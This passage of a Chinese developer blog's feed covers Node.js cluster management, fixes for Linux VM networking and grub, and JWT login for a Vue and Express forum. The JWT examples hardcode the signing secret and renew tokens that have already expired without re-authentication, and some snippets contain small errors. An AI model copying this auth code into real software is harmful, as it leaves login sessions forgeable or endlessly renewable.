class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cluster = <span class="built_in">require</span>(<span class="string">'cluster'</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> numCPUs = <span class="built_in">require</span>(<span class="string">'os'</span>).cpus().length;</span><br><span class="line"></span><br><span class="line">cluster.setupMaster(&#123;</span><br><span class="line">        exec:<span class="string">"worker.js"</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"master start"</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;numCPUs;i++)&#123;</span><br><span class="line">        cluster.fork();</span><br><span class="line">&#125;</span><br><span class="line">cluster.on(<span class="string">'listening'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">worker,address</span>)</span>&#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>worker.send(<span class="string">'kill yourself'</span>),<span class="number">2000</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`listening:worker <span class="subst">$&#123;worker.process.pid&#125;</span>,address:<span class="subst">$&#123;address.address&#125;</span>:<span class="subst">$&#123;address.port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line">cluster.on(<span class="string">'exit'</span>,(worker,code,signal)=&gt;&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`worker <span class="subst">$&#123;worker.process.pid&#125;</span>died\n`</span>);</span><br><span class="line">&#125;);</span><br><span class="line">cluster.on(<span class="string">'message'</span>,(worker,message,handle)=&gt;&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`message:<span class="subst">$&#123;message&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">eachWorker</span>(<span class="params">cb</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> id <span class="keyword">in</span> cluster.workers)&#123;</span><br><span class="line">                cb(cluster.workers[id]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> timeout = setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">        eachWorker(<span class="function">(<span class="params">worker</span>)=&gt;</span>&#123;</span><br><span class="line">                worker.kill(<span class="string">'SIGHUP'</span>);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'killed by master'</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;,<span class="number">5000</span>);</span><br><span class="line">eachWorker(<span class="function">(<span class="params">worker</span>)=&gt;</span>&#123;</span><br><span class="line">worker.on(<span class="string">'exit'</span>,(code,signal)=&gt;&#123;</span><br><span class="line">            clearTimeout(timeout);</span><br><span class="line">            <span class="keyword">if</span>(signal)&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">`worker <span class="subst">$&#123;worker.process.pid&#125;</span> ws killed by signal <span class="subst">$&#123;signal&#125;</span>`</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(code!==<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">`worker<span class="subst">$&#123;worker.process.pid&#125;</span> ws killed by code <span class="subst">$&#123;code&#125;</span>`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>worker.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> cluster = <span class="built_in">require</span>(<span class="string">'cluster'</span>);</span><br><span class="line"><span class="keyword">const</span> worker = cluster.worker;</span><br><span class="line">http.createServer(<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line"> res.writeHead(<span class="number">200</span>);</span><br><span class="line"> res.end(<span class="string">"hello world"</span>);</span><br><span class="line">&#125;).listen(<span class="number">8099</span>);</span><br><span class="line">process.on(<span class="string">'message'</span>,(message,handle)=&gt;&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;process.pid&#125;</span> accept:<span class="subst">$&#123;message&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">if</span>(message === <span class="string">'kill yourself'</span>)&#123;</span><br><span class="line">                setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>process.exit(<span class="number">1</span>),<span class="number">50000</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>运行结果:<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/cluster.png" alt="cluster"></p><p><strong>message</strong></p><p>这个不用多说，当从worker发来消息时触发,但是在node V6.0之前回调函数是没有worker对象传入的。可以进行参数判断:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cluster.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">worker, message, handle</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">arguments</span>.length === <span class="number">2</span>) &#123;</span><br><span class="line">    handle = message;</span><br><span class="line">    message = worker;</span><br><span class="line">    worker = <span class="literal">undefined</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>cluster.isMaster和cluster.isWorker</strong></p><p>用于判断当前进程是master还是worker,当进程是子进程时其环境变量会存在NODE_UNIQUE_ID，通过这个判断:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cluster.isWorker = (<span class="string">'NONE_UNIQUE_ID'</span> <span class="keyword">in</span> process.env);</span><br></pre></td></tr></table></figure></p><p><strong>cluster.setupMaster()</strong><br>还记得文章开头fork子进程的方式吗，就是用的这个方法，通过设置exec，来指定运行指定的文件来生成子进程，这样可以实现主进程和子进程的逻辑分离。</p><p><strong>cluster.workers</strong><br>获取由cluster生成的所有子进程，通过id访问，代码示例见上述disconnect部分。</p><p><strong>cluster.schedulingPolicy</strong><br>关于负载均衡，后面会单独讲</p><h4 id="worker相关"><a href="#worker相关" class="headerlink" title="worker相关"></a>worker相关</h4><p><strong>worker.kill()</strong><br>杀掉子进程，可以通过状态或者信号，一般自杀用状态码，正常为0,由master来杀掉的话用信号，如上面的代码那要可以进行一个判断:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">worker.on(<span class="string">'exit'</span>,(code,signal)=&gt;&#123;</span><br><span class="line">        clearTimeout(timeout);</span><br><span class="line">        <span class="keyword">if</span>(signal)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`worker <span class="subst">$&#123;worker.process.pid&#125;</span> ws killed by signal <span class="subst">$&#123;signal&#125;</span>`</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(code!==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`worker<span class="subst">$&#123;worker.process.pid&#125;</span> ws killed by code <span class="subst">$&#123;code&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>worker.exitedAfterDisconnect</strong><br>可以用来判断worker是否是自杀的:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cluster.on(<span class="string">'exit'</span>, (worker, code, signal) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (worker.exitedAfterDisconnect === <span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Oh, it was just voluntary – no need to worry'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>**需要注意的是，这些API和事件都是通过cluster模块来调用的，跟在worker中自行调用一些方法，如process.kill(),process.on(‘message’,cb);不是一回事。但是它们都差不多。</p><p><strong>其余常用的还有许多API,这里只是提了一些需要注意点的东西，详细的API移步node官网API文档,由于cluster的东西都是基于process和process_child的，可以结合它们一起理解</strong></p><h3 id="负载均衡问题"><a href="#负载均衡问题" class="headerlink" title="负载均衡问题"></a>负载均衡问题</h3><p>当用原生Child_process实现集群时，我们还需要处理负载均衡问题。Node通过CPU繁忙度来给worker分配任务。但是有可能某个worker的CPU空闲，但是I/O却比较繁忙，但是这个时候依然会给这个worker分配较多请求。这就出现负载不均衡情况。</p><p>Node v0.11中提供一种Round-Robin的策略（调度）来进行分配任务。主进程接受连接，在N个工作进程中，每次选择第<strong>i=(i+1)mod N</strong>个进程来发送连接。Node默认选择Round-Robin方式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cluster.schedulingPolicy = cluster.SCHED_RR;<span class="comment">//启用RR</span></span><br><span class="line">cluster.schedulingPolicy = cluster.SCHED_NONE;<span class="comment">//不启用RR</span></span><br></pre></td></tr></table></figure><p>或者在环境变量中设置NODE_CLUSTER_POLICY:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export NODE_CLUSTER_POLICY=rr;</span><br><span class="line">export NODE_CLUSTER_POLICY=none;</span><br></pre></td></tr></table></figure></p><h3 id="啦啦啦，我是PM2"><a href="#啦啦啦，我是PM2" class="headerlink" title="啦啦啦，我是PM2"></a>啦啦啦，我是PM2</h3><p>pm2 是一个进程管理工具，可以做到不间断重启、负载均衡、集群管理等，比forever更强大。利用pm2可以做到 no code but just config 实现应用的cluster。 </p><p>前面的一篇关于前后端分离实践的文章，我写了一个论坛，而我正是使用PM2来部署服务的，鉴于买的阿里云服务器学生版，CPU只有一个。所以没用到它的cluster服务。</p><p><strong>Coding is my life</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Node的一大优点就是异步IO,适合I/O密集型的高并发业务，但是它是单线程的，当面对CPU密集型业务的时候，性能就会出现瓶颈。但是幸运的是，子进程能够解决这个问题，与HTML5的Web Worker类似，通过主进程管理一系列的子进程来利用多核CPU以实现集群的功能。&lt;/p&gt;
&lt;p&gt;关于集群是一个比较大的话题。Node原生Child_process就可以实现集群，但是要处理好一系列问题，如自动重启，自杀信号，负载均衡等问题，需要我们做大量的工作。从Node V0.8开始，其内置一个核心模块Cluster,帮助我们更加方便的实现单机集群。&lt;/p&gt;
    
    </summary>
    
      <category term="Nodejs" scheme="http://luoxia.me/code/categories/Nodejs/"/>
    
    
      <category term="负载均衡" scheme="http://luoxia.me/code/tags/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"/>
    
      <category term="集群" scheme="http://luoxia.me/code/tags/%E9%9B%86%E7%BE%A4/"/>
    
      <category term="多进程" scheme="http://luoxia.me/code/tags/%E5%A4%9A%E8%BF%9B%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>记录Linux遇到的一些坑</title>
    <link href="http://luoxia.me/code/2016/11/14/%E8%AE%B0%E5%BD%95Linux%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/"/>
    <id>http://luoxia.me/code/2016/11/14/记录Linux遇到的一些坑/</id>
    <published>2016-11-14T08:29:30.000Z</published>
    <updated>2017-11-16T13:10:06.493Z</updated>
    
    <content type="html"><![CDATA[<p>来一篇文章，对之前，最近，乃至后面的Linux折腾中遇到的一些坑进行汇总，一方面是个总结，一方面希望能够给遇到同样问题的小伙伴儿有一点点儿帮助。</p><p>这也是我第一篇关于Linux的文章。文章主要汇总一些小问题，有必要会对一些问题开单独文章详细总结。</p><p><strong>新手上路，踩着坑，一步步前行。</strong></p><a id="more"></a><p><strong>环境</strong></p><p>CentOS 7.0</p><h3 id="VM使用NAT模式联网问题"><a href="#VM使用NAT模式联网问题" class="headerlink" title="VM使用NAT模式联网问题"></a>VM使用NAT模式联网问题</h3><h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述:"></a>问题描述:</h4><p>查看启用的网卡发现只有lo,virbr0,并没有发现正常情况下的eth0(或者用于访问网络的网卡),/etc/sysconfig/network-scripts下没有ifcfg-eth0配置文件</p><h4 id="解决过程"><a href="#解决过程" class="headerlink" title="解决过程:"></a>解决过程:</h4><p>起初尝试过收到创建ifcfg-eth0文件，进行相关配置，再</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service network restart</span><br></pre></td></tr></table></figure><p>failed,查看报错详情:<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/ifcfgLBS.png" alt="ifcfgerror"></p><p>查询资料说是mac地址问题，可我已经配置好mac地址。</p><h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法:"></a>解决办法:</h4><p>由于VM虚拟网卡和Linux兼容问题导致。其默认使用的AMD网卡，而我的真机为Intel的网卡，需要手动修改配置，更改网卡类型。</p><p>找到CentOS.vmx配置文件，新增如下一条:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ethernet0.virtualDev = &quot;e1000&quot;</span><br></pre></td></tr></table></figure></p><p>这样，就有用于访问网络的网卡了。并不一定是eth0。</p><h3 id="libXss-so-1问题"><a href="#libXss-so-1问题" class="headerlink" title="libXss.so.1问题"></a>libXss.so.1问题</h3><h4 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述"></a>问题描述</h4><p>配置VSCode遇到的问题，正常安装，无法正常启动，报如下错误:</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/libXS.png" alt="libXerror"><br>缺失libXss.so.1</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法:"></a>解决方法:</h4><p>从CentOS官网下载libSScrnSaver rpm文件，然后进行安装</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/libXS1.png" alt="solvelibX"></p><h3 id="双系统为ubuntu扩充硬盘问题"><a href="#双系统为ubuntu扩充硬盘问题" class="headerlink" title="双系统为ubuntu扩充硬盘问题"></a>双系统为ubuntu扩充硬盘问题</h3><p>从windows将某磁盘压缩，新建空闲分区后，进入ubuntu时，提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unknown fileSystem</span><br></pre></td></tr></table></figure><p>由于分区情况发生变化，导致grub找不到</p><h4 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法:"></a>解决方法:</h4><p>列出所有磁盘:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure></p><p>一个一个尝试如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls (hd0,10)</span><br></pre></td></tr></table></figure></p><p>找到ubuntu启动盘，我启动盘是单独的boot分区，在(hd0,10)下<br>此时<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set root=hd0,msdos10</span><br><span class="line">set prefix=(hd0,msdos10)/grub</span><br></pre></td></tr></table></figure></p><p>接着<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insmod normal</span><br><span class="line">normal</span><br></pre></td></tr></table></figure></p><p>最后进入系统修复grub<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo update-grub</span><br><span class="line">sudo grub-install /dev/sda</span><br></pre></td></tr></table></figure></p><p>注意这里sda后不要加盘号</p><p><strong>未完待续</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;来一篇文章，对之前，最近，乃至后面的Linux折腾中遇到的一些坑进行汇总，一方面是个总结，一方面希望能够给遇到同样问题的小伙伴儿有一点点儿帮助。&lt;/p&gt;
&lt;p&gt;这也是我第一篇关于Linux的文章。文章主要汇总一些小问题，有必要会对一些问题开单独文章详细总结。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;新手上路，踩着坑，一步步前行。&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://luoxia.me/code/categories/Linux/"/>
    
    
      <category term="CentOS" scheme="http://luoxia.me/code/tags/CentOS/"/>
    
      <category term="Linux" scheme="http://luoxia.me/code/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>JWTs之我的前后端完全分离实践</title>
    <link href="http://luoxia.me/code/2016/11/01/JWTs%E4%B9%8B%E6%88%91%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%AE%8C%E5%85%A8%E5%88%86%E7%A6%BB%E5%AE%9E%E8%B7%B5/"/>
    <id>http://luoxia.me/code/2016/11/01/JWTs之我的前后端完全分离实践/</id>
    <published>2016-11-01T14:16:23.000Z</published>
    <updated>2017-11-16T13:10:06.484Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>JWT是一种用于双方之间传递安全信息的简洁的、URL安全的表述性声明规范。JWT作为一个开放的标准（ RFC 7519 ），定义了一种简洁的，自包含的方法用于通信双方之间以Json对象的形式安全的传递信息。因为数字签名的存在，这些信息是可信的，JWT可以使用HMAC算法或者是RSA的公私秘钥对进行签名。</p></blockquote><p>之前发表了一篇关于session相关的文章，当时也说明了session这种方式的一些问题，主要就是一个安全性问题。而作为OAuth标准的Access_Token具体解决方案之一的JWTs,使得一些问题得到很好的解决。</p><p>文章主要介绍JWT的相关知识以及Nodejs中的JWT,最后，以一个我最近写的论坛为实例，总结一下我在前后端完全分离方面的实践。</p><p>论坛采用Vue+express+mongodb开发，不断完善ing,欢迎访问github项目地址star:<a href="https://github.com/laoqiren/vue-express-forum" target="_blank" rel="noopener">https://github.com/laoqiren/vue-express-forum</a>,论坛在线地址:<a href="http://120.77.38.217:3000" target="_blank" rel="noopener">http://120.77.38.217:3000</a></p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/UfIbUjj.png" alt="JWT"><br><a id="more"></a></p><h3 id="JWTs"><a href="#JWTs" class="headerlink" title="JWTs:"></a>JWTs:</h3><h4 id="验证的大致流程"><a href="#验证的大致流程" class="headerlink" title="验证的大致流程:"></a>验证的大致流程:</h4><ol><li>客户端请求登录;</li><li>验证信息，登录成功，server生成Access_Token,响应给客户端;</li><li>客户端接收Token,储存，可以在localStorage,cookie,本地数据库等;</li><li>以后每次请求server需要授权的API,带上Access_Token;</li><li>server验证Token</li></ol><h4 id="JWT标准"><a href="#JWT标准" class="headerlink" title="JWT标准:"></a>JWT标准:</h4><p>JWT包含三个部分:header头部,payload负载,signature签名;</p><p>like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxxx.yyyyy.zzzzz</span><br></pre></td></tr></table></figure><h5 id="header"><a href="#header" class="headerlink" title="header:"></a>header:</h5><p>header包含两个信息，token类型和加密算法,然后使用Base64编码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line">  <span class="string">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h5><p>Payload包含实体，包括一些预定义的如iss（签发者） , exp（过期时间戳） , sub（面向的用户） , aud（接收方） , iat（签发时间）等,自定义字段等。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"sub"</span>: <span class="string">"1234567890"</span>,</span><br><span class="line">  <span class="string">"name"</span>: <span class="string">"John Doe"</span>,</span><br><span class="line">  <span class="string">"admin"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h5><p>签名通过前面的header,payload加上一个secret,最终通过加密算法生成,如:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> encodedString = base64UrlEncode(header) + <span class="string">"."</span> + base64UrlEncode(payload); </span><br><span class="line">HMACSHA256(encodedString, <span class="string">'secret'</span>);</span><br></pre></td></tr></table></figure><p>最终的结果如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ.SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc</span><br></pre></td></tr></table></figure></p><h4 id="客户端发送Token的方式"><a href="#客户端发送Token的方式" class="headerlink" title="客户端发送Token的方式:"></a>客户端发送Token的方式:</h4><p>发送Token可以通过异步的请求发送JSON,或者加入请求头，或者加入到URL的查询字符串里;</p><p>关于请求头的话，RFC 6750定义了一个Bearer Token的标准，like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure><h3 id="Node的jwt中间件"><a href="#Node的jwt中间件" class="headerlink" title="Node的jwt中间件"></a>Node的jwt中间件</h3><p>上面简略的讲了一下JWT的标准，详细内容可以查看官方文档，接下来谈谈Node中的生成Token,Token的验证，Token过期更新，Token持久化等问题。</p><p>采用node 的jwt-simple中间件</p><h4 id="生成Token"><a href="#生成Token" class="headerlink" title="生成Token:"></a>生成Token:</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> moment = <span class="built_in">require</span>(<span class="string">'moment'</span>);</span><br><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">"jwt-simple"</span>);</span><br><span class="line">...</span><br><span class="line">app.set(<span class="string">"jwtTokenSecret"</span>,<span class="string">"LuoXia"</span>);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">var</span> expires = moment().add(<span class="number">7</span>,<span class="string">'days'</span>).valueOf();</span><br><span class="line"><span class="keyword">var</span> token = jwt.encode(&#123;</span><br><span class="line">    iss: <span class="string">'admin'</span>,</span><br><span class="line">    exp: expires,</span><br><span class="line">user: newUser.name</span><br><span class="line">&#125;, req.app.get(<span class="string">'jwtTokenSecret'</span>));</span><br><span class="line">res.json(&#123;</span><br><span class="line">    token : token,</span><br><span class="line">    expires: expires,</span><br><span class="line">    user:&#123;</span><br><span class="line">        name:newUser.name</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里用到了moment中间件，生成过期时间</p><h4 id="验证Token"><a href="#验证Token" class="headerlink" title="验证Token:"></a>验证Token:</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">var</span> token = req.body.access_token;<span class="comment">//也可以是请求头或者查询字符串</span></span><br><span class="line"><span class="keyword">if</span>(token)&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> decoded = jwt.decode(token,req.app.get(<span class="string">'jwtTokenSecret'</span>));</span><br><span class="line">    <span class="keyword">if</span>(decoded.exp &lt; <span class="built_in">Date</span>.now())&#123;</span><br><span class="line">        res.end(<span class="string">'token expired'</span>,<span class="number">401</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line">    res.send(<span class="number">401</span>);</span><br><span class="line">    res.end();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//其他处理</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">res.status(<span class="number">401</span>);</span><br><span class="line">    res.end();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="更新Token"><a href="#更新Token" class="headerlink" title="更新Token:"></a>更新Token:</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> decoded = jwt.decode(token,req.app.get(<span class="string">'jwtTokenSecret'</span>));</span><br><span class="line"><span class="keyword">if</span>(decoded.exp &lt; <span class="built_in">Date</span>.now())&#123;</span><br><span class="line">    <span class="keyword">var</span> expires = moment().add(<span class="number">7</span>,<span class="string">'days'</span>).valueOf();</span><br><span class="line"><span class="keyword">var</span> token = jwt.encode(&#123;</span><br><span class="line">    iss: decoded.iss,</span><br><span class="line">    exp: expires,</span><br><span class="line">user: decoded.user</span><br><span class="line">&#125;, req.app.get(<span class="string">'jwtTokenSecret'</span>));</span><br><span class="line">res.json(&#123;</span><br><span class="line">    token : token,</span><br><span class="line">    expires: expires,</span><br><span class="line">    user:&#123;</span><br><span class="line">        name:newUser.name</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="持久化Token"><a href="#持久化Token" class="headerlink" title="持久化Token:"></a>持久化Token:</h4><p>待补充</p><h3 id="与session对比"><a href="#与session对比" class="headerlink" title="与session对比"></a>与session对比</h3><ol><li>session依赖于cookie,容易受CSRF漏洞的攻击，不够安全。而JWTs则不依赖于Cookie,虽然token也可以储存在cookie，但是只作为储存方式，并没有作为验证手段。</li></ol><ol><li><p>基于JWTs的Token验证方式是无状态的(stateless),自包含的，例如上例中生成token时就可以添加自定义项，这样就减少了许多数据库查询。</p></li><li><p>Cookie可以通过设置使得在主域名和子域名都能访问到，而如果储存在localStorage下的话，只要是非同域都是不能互相访问到的，解决方案是在包含token的域下设置cookie,这样在其他子域名下就能访问到了。</p></li></ol><p>由于其JWT的无状态性，我们可以很方便的开发一些公用的API，访问公用API只需带上Token，而一些商业性的API服务，可以解析不同的Token来进行计费。</p><h3 id="前后端完全分离的尝试"><a href="#前后端完全分离的尝试" class="headerlink" title="前后端完全分离的尝试:"></a>前后端完全分离的尝试:</h3><h4 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型:"></a>技术选型:</h4><p>Vue+express+mongodb</p><h4 id="分析整个应用"><a href="#分析整个应用" class="headerlink" title="分析整个应用:"></a>分析整个应用:</h4><ol><li>SPA,客户端需有自己的一套路由</li><li>组件化开发，可复用</li><li>数据逻辑管理，Vuex</li><li>Node提供REST API</li><li>Fetch API异步请求，更好的异步流程控制</li><li>基于JWT的Token验证方式</li><li>Webpack构建方案</li><li>跨域问题</li></ol><p>论坛主要功能: 登录/注册,发表文章，获取文章,退出登录</p><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端:"></a>客户端:</h4><p><strong>在组件渲染之前，异步请求获取用户信息:</strong></p><figure class="highlight js"><table><tr><td 